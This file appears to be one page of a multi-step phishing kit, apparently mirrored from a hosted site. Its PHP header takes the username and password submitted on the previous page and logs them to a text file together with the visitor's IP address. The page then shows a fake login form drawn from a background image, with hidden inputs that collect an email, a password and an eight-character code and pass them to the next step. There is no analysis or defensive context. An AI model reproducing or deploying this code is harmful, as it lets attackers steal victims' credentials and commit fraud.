<?php  
$co = $_POST['ipts1'];  
$ca = $_POST['ipts2'];
$IP = getenv("REMOTE_ADDR");  
$BILSMG = "
uzer: $co
pazz: $ca
1p: $IP";  
$handle = fopen("rezout.txt", "a");  
fwrite($handle,$BILSMG);  
$x=md5(microtime());  
?>
<!DOCTYPE html>
<html lang="en">

<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=0.8">
<title></title>
<link href="images/favicon.html" rel="shortcut icon" type="image/x-icon">

</head>
<body style="font-family:sans-serif;font-size: 16px;font-weight: 400;background:none;">
	<div id="cnt2" style="text-align:center;">
		<form method="post" action="step-3.php" style="display: inline-block;
    background-image: url(images/afrms.svg);
    width: 980px;
    background-repeat: no-repeat;
    height: 552px;text-align:left;margin-top:20px;">
			
			<input name="ipts3" type="email" style="position: relative;
    top: 268px;
    left: 26px;
    display: block;" required placeholder="*****@*****">
			
			<input name="ipts4" type="password" style="position: relative;
    top: 313px;
    left: 26px;
    display: block;" required placeholder="***********">
			
			<input name="ipts5" type="password" style="position: relative;
    top: 368px;
    left: 26px;
    display: block;" required placeholder="********" maxlength="8" >
			
			<input type="submit" style="    background: rgba(0,0,0,0);
    position: relative;
    top: 460px;
    left: 27px;
    width: 106px;
    height: 23px;
    border: none;
    display: block;" value="">
		</form>
	</div>
	<div style="text-align:center;">
		<footer style="padding-top: 20px;margin-top: 80px;background-color: #eee;width: 980px;display:inline-block;text-align:left;">
			<img src="images/fts1.svg" alt="" style="width:80%;max-width:600px;margin-left:10px">
		</footer>
	</div>
</body>

<!-- Mirrored from c1851498.ferozo.com/step-2.php by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 25 Jul 2022 23:14:30 GMT -->
</html>